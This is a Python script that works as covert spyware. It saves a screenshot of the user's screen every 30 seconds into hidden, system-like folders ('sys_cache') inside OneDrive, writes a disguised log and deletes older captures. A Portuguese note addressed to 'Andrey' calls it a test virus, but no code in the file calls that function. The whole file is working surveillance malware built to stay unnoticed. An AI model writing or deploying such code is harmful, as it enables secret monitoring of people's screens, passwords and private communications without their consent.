import os
import time
import datetime
import sys
import pyautogui
import logging

from install import INSTALL_DIR

# Diretório dentro do OneDrive
BASE_DIR = os.path.join(os.getenv("OneDrive"), "sys_cache")
IMG_DIR = os.path.join(BASE_DIR, "img")
COUNTER_FILE = os.path.join(BASE_DIR, "counter.txt")
LOG_FILE = os.path.join(BASE_DIR, "syscache.log")

INTERVAL = 30  # segundos
RETENTION_DAYS = 3

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def create_readme():
    readme_path = os.path.join(INSTALL_DIR, "README_ANDREY.txt")
    with open(readme_path, "w") as f:
        f.write("Oi, Andrey! Aqui eh o Will.\n")
        f.write("Fiz esse teste aqui de um viruszinho e voce foi meu primeiro teste hehe.\n")
        f.write("Parabens por ter encontrado!\n")


def create_dirs():
    for path in [BASE_DIR, IMG_DIR]:
        if not os.path.exists(path):
            os.makedirs(path)
            os.system(f'attrib +h "{path}"')


def load_counter():
    if os.path.exists(COUNTER_FILE):
        try:
            with open(COUNTER_FILE, "r") as f:
                return int(f.read().strip())
        except:
            return 0
    return 0


def save_counter(counter):
    with open(COUNTER_FILE, "w") as f:
        f.write(str(counter))


def save_number(counter, timestamp):
    file_path = os.path.join(BASE_DIR, f"{timestamp}.txt")
    with open(file_path, "w") as f:
        f.write(str(counter))


def take_screenshot(timestamp):
    logging.info(f"Taking screenshot #{timestamp}")
    filepath = os.path.join(IMG_DIR, f"S_{timestamp}.png")
    ss = pyautogui.screenshot()
    ss.save(filepath)


def cleanup_old_files():
    now = time.time()
    cutoff = now - (RETENTION_DAYS * 86400)

    for root, _, files in os.walk(BASE_DIR):
        for file in files:
            path = os.path.join(root, file)

            if path == COUNTER_FILE:
                continue

            if os.path.isfile(path):
                if os.path.getmtime(path) < cutoff:
                    try:
                        os.remove(path)
                    except:
                        pass


def main_loop():
    counter = load_counter()

    while True:
        counter += 1
        timestamp = datetime.datetime.now().strftime("%Y_%m_%d-%H_%M_%S")

        save_number(counter, timestamp)
        take_screenshot(timestamp)
        save_counter(counter)
        cleanup_old_files()

        time.sleep(INTERVAL)


if __name__ == '__main__':
    try:
        create_dirs()
        main_loop()
    except KeyboardInterrupt:
        print('\nExiting by user request.\n', file=sys.stderr)
        sys.exit(0)